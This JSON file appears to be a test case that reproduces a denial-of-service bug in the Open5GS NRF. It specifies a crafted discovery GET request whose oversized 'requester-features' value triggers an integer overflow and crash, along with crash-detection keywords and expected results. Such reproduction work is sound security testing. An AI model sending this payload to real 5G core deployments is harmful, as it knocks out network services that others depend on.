{
  "schema_version": 1,
  "id": "open5gs_4263_nrf_requester_features_overflow",
  "title": "NRF requester-features integer overflow DoS",
  "component": "nrf",
  "protocol": "SBI",
  "issue": "https://github.com/open5gs/open5gs/issues/4263",
  "fix": "https://github.com/open5gs/open5gs/pull/4333",
  "description": "NRF 的 SBI 发现接口使用 requester-features 位图参数，Open5GS v2.7.6 以 atoi() 解析该字段，可被超大整数值触发整数溢出导致 NRF 进程崩溃。本 testcase 通过解析 SBI 协议结构，构造含畸形 requester-features 参数的 GET 请求验证该漏洞。",
  "transport": {
    "scheme": "http",
    "http2_prior_knowledge": true,
    "sender_container": "amf"
  },
  "target": {
    "container": "nrf",
    "host": "nrf",
    "port": 7777,
    "method": "GET",
    "path": "/nnrf-disc/v1/nf-instances"
  },
  "query": {
    "target-nf-type": "BSF",
    "requester-nf-type": "AMF",
    "target-plmn-list": "[{\"mcc\":\"123\",\"mnc\":\"456\"}]",
    "requester-plmn-list": "[{\"mcc\":\"999\",\"mnc\":\"70\"}]",
    "requester-features": "ffffffffffffffffffffffffffffffffffffffff"
  },
  "detection": {
    "fatal_keywords": [
      "FATAL",
      "abort",
      "assert",
      "Numerical result out of range",
      "ogs_uint64_from_string",
      "SIGABRT"
    ]
  },
  "expect": {
    "vulnerable": [
      "nrf_crash",
      "nrf_restart",
      "fatal_log"
    ],
    "fixed_or_safe": [
      "http_error",
      "safe_reject",
      "nrf_alive"
    ]
  }
}
